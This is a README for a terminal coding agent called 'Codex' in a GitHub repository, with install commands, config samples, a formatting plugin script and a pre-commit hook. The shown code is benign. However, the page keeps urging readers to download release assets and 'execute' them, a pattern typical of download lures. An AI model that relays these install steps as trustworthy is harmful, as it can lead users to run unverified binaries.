# Codex: Lightweight Terminal Coding Agent for Developers

[https://github.com/Yermehyn/codex/releases](https://github.com/Yermehyn/codex/releases)  
[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/Yermehyn/codex/releases)

![Terminal banner](https://images.unsplash.com/photo-1518779578993-ec3579fee39f?auto=format&fit=crop&w=1400&q=80)

Lightweight coding agent that runs in your terminal. Codex helps you write, test, refactor, and automate code flows from the command line. It works with your editor, CI pipelines, and shell scripts. Use it to speed up routine tasks and embed coding logic into scripted workflows.

Why this repo
- Small footprint. Core binary stays under 10 MB.
- Shell-first design. Use it directly from bash, zsh, fish, or any POSIX shell.
- Extensible. Add plugins that expose new commands or language tools.
- Offline mode. Local knowledge keeps common tasks available without network access.

Badges
- Build: [![Build Status](https://img.shields.io/github/actions/workflow/status/Yermehyn/codex/ci.yml?branch=main&style=flat-square)](https://github.com/Yermehyn/codex/actions)
- Releases: [![Releases](https://img.shields.io/github/v/release/Yermehyn/codex?label=latest%20release&style=flat-square)](https://github.com/Yermehyn/codex/releases)
- License: [![License](https://img.shields.io/github/license/Yermehyn/codex?style=flat-square)](https://github.com/Yermehyn/codex/blob/main/LICENSE)

Highlights
- Command palette for code tasks
- Inline test runner and formatter
- Template-based scaffolds
- Plugin API for custom actions
- Lightweight isolated execution

Quick links
- Releases and binaries: https://github.com/Yermehyn/codex/releases
- Docs: docs/ (in repo)
- Issues: GitHub Issues

Install

Download the release file from https://github.com/Yermehyn/codex/releases and execute it on your machine. Releases include prebuilt binaries for Linux, macOS, and Windows. The release asset is named like codex-<version>-<platform>.tar.gz or codex-<version>-<platform>.zip.

Example install steps (Linux / macOS)
- Download the archive from the releases page.
- Extract the archive.
- Move the binary to /usr/local/bin or another PATH folder.
- Make the binary executable.

Commands you can run (example)
```sh
# download and install (replace <file> with the asset name)
curl -L -o codex.tar.gz "https://github.com/Yermehyn/codex/releases/download/v1.2.3/codex-1.2.3-linux-amd64.tar.gz"
tar -xzf codex.tar.gz
sudo mv codex /usr/local/bin/
chmod +x /usr/local/bin/codex

# run the agent
codex --help
```

If you prefer GUI-style badges, use this button to go to the releases page:  
[![Get Releases](https://img.shields.io/badge/Get%20Releases-Open%20Assets-green?logo=github&style=for-the-badge)](https://github.com/Yermehyn/codex/releases)

Quick start

1. Initialize a project
```sh
cd ~/projects
git clone https://github.com/Yermehyn/codex-starter my-app
cd my-app
codex init
```

2. Generate a module
```sh
codex gen module auth --lang=go
```

3. Run tests
```sh
codex test ./...
```

4. Run a code action
```sh
codex run "refactor:extract-function" src/*.js
```

Core concepts

- Agents: Small tasks that act on files or streams. Agents expose commands you run from the shell.
- Actions: Higher-level flows that combine agents. Actions support flags and templates.
- Plugins: Dynamic modules that register new agents and actions. Plugins can be local scripts or compiled modules.
- Profiles: Per-project configuration that stores preferences, toolchains, and common commands.

Configuration

Place .codex/config.yaml in the repository root or $HOME/.codex/config.yaml for global settings. Example config:
```yaml
toolchain:
  node: 18
  go: 1.20
editor: "code"     # or vim, nvim, emacs
format:
  go: true
  js: true
paths:
  cache: "~/.codex/cache"
```

Plugin example

A minimal plugin exposes one command. Place the script in .codex/plugins or install via a binary plugin.

plugin-jsfmt.sh
```sh
#!/usr/bin/env bash
# plugin for formatting JS files using prettier
cmd_format() {
  for f in "$@"; do
    npx prettier --write "$f"
  done
}
case "$1" in
  format) shift; cmd_format "$@" ;;
  *) echo "plugin-jsfmt: unknown command" ;;
esac
```

Then run:
```sh
codex plugin run jsfmt format src/foo.js
```

Use cases

- Generate boilerplate code from templates.
- Extract and inline functions across a codebase.
- Run a test subset before pushing.
- Enforce style and format with pre-commit hooks.
- Create CI scripts that call codex for reproducible code transforms.

Sample workflows

CI lint + test
- Install codex in CI step.
- Run codex format and codex test.
- Fail the pipeline on non-zero exit.

Pre-commit hook
- Add .git/hooks/pre-commit with:
```sh
#!/usr/bin/env bash
codex format
codex test --quiet
```
- Make the hook executable.

Refactor flow
- Use codex to locate an API usage.
- Extract function with codex refactor.
- Run tests across the affected packages.

Commands reference (selected)

- codex init       — initialize codex in a repo
- codex gen        — scaffold code from templates
- codex run        — run an action or agent
- codex test       — run tests with smart selection
- codex fmt        — run formatters
- codex plugin     — manage plugins
- codex config     — show and edit config

Each command supports --help for details and examples.

Architecture overview

- Core binary: compact runtime written in Go. It handles CLI parsing, plugin loading, and job orchestration.
- Plugin layer: loads scripts or compiled modules. Plugins run in a sandboxed process.
- Template engine: lightweight template language with helpers for loops, conditionals, and variables.
- Cache: local cache stores parsed ASTs, templates, and test results for fast runs.

Security model

- Plugins run as separate processes. The agent invokes them with a limited environment.
- The binary runs under the user account. It does not require escalated privileges.
- You control which plugins run in a project via .codex/plugins or the config file.

Performance

- Codex uses parallel execution where possible.
- Caching reduces repeated parsing and repeated downloads.
- The binary uses a small memory footprint by default.

Integration

Editor
- Use the codex CLI from your editor tasks or keymaps.
- Use language-specific plugins for code actions.

CI
- Add a step that installs the release binary.
- Call codex commands to run test filters, formatters, or code generators.

Containers
- Add codex binary into your builder image.
- Use cached artifacts to accelerate multi-stage builds.

Testing and debugging

- Use codex test --debug to capture more logs.
- Use codex run --dry to perform a dry run of an action without file writes.
- Use codex profile to dump runtime metrics.

Contributing

- Open an issue for a new feature or bug.
- Fork the repo and create a branch for your work.
- Add tests for new features.
- Follow the style guide in CONTRIBUTING.md.

Releases & changelog

Get release assets and install files from the releases page. Download the correct asset for your platform and execute the file as described in the Install section. Visit the full release list and changelog at https://github.com/Yermehyn/codex/releases

License

This project uses the MIT License. See LICENSE for details.

Support

Open issues in the repo for bug reports and feature requests. Each issue should include steps to reproduce, expected result, and actual result when possible.

Resources and links

- Releases: https://github.com/Yermehyn/codex/releases
- Core design doc: docs/architecture.md
- Plugin API: docs/plugins.md
- FAQ: docs/faq.md

Screenshots

Terminal demo:
![Terminal demo](https://raw.githubusercontent.com/github/explore/main/topics/terminal/terminal.png)

Sample plugin flow:
![Plugin flow diagram](https://miro.medium.com/max/1400/1*2QX1s7b2m7r0V3XkV8vfxQ.png)